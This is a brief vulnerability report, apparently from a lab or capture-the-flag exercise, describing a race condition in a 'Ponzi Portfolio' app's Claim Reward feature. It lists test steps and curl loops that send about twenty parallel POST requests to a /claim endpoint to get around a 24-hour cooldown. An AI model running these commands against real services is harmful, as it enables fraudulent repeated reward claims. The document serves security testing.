## Use case

The vulnerability exists in the 'Claim Reward' feature of the Ponzi Portfolio system, allowing multiple claims to be processed simultaneously due to a lack of proper checks, which can lead to users claiming rewards multiple times within a 24-hour period.

## Steps to test

1. Register a new guest account on the application.
2. Capture the claim request using Burp Suite or browser DevTools.
3. Use curl to send multiple parallel requests to the /claim endpoint with the session cookie.
4. Observe if multiple claims are processed successfully despite the 24-hour cooldown.

## Commands

```text
for i in {1..20}; do curl -s -X POST http://TARGET/claim -H 'Cookie: connect.sid=...' -o response_$i.json & done; wait
curl -Z --parallel-immediate -K race_config.txt
for i in {1..20}; do
curl -s -X POST http://TARGET/claim -H "Cookie: connect.sid=..." -o response_$i.json &
done
wait
curl -s -X POST http://TARGET/claim -H "Cookie: connect.sid=..." -o response_$i.json &
```
